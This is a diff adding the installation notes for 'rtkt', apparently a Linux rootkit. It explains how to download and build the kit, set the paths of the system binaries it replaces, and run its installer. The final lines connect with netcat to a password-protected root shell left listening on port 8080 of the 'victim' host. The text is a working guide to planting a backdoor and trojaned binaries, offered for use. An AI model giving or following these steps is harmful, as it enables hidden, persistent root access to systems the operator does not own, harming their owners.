@@ -1,0 +1,31 @@
+rtkt-0.3.0 - by SodaPhish
+
+Acquire the rtkt image from http://sodaphish.com/files/, then:
+
+	# tar -zxvf rtkt-current.tar.gz
+	# cd rtkt-X.Y.Z
+
+X.Y.Z will be the version number of the current rtkt image.
+
+If you are on a non x86 Linux system, you will need to:
+
+	# cd src
+	# make; make install
+
+which will re-build all the binaries in the kit for the host system,
+otherwise, you can just:
+
+	# ./mkrtkt
+
+Regardless of whether or not you have to rebuild the binaries, you 
+should make sure you have the paths of the files you're planning on 
+replacing correct in the src/*/*.c files. 
+
+If you haven't already done so, run the install script: 
+
+	# ./mkrtkt
+
+You should be done.  You can now use `nc` to connect to port 8080 
+i.e. `nc victim.host.name 8080` on the box and have a protected root 
+shell.  The install script will tell you the password protecting
+the rootshell, and you're certainly free to change it.
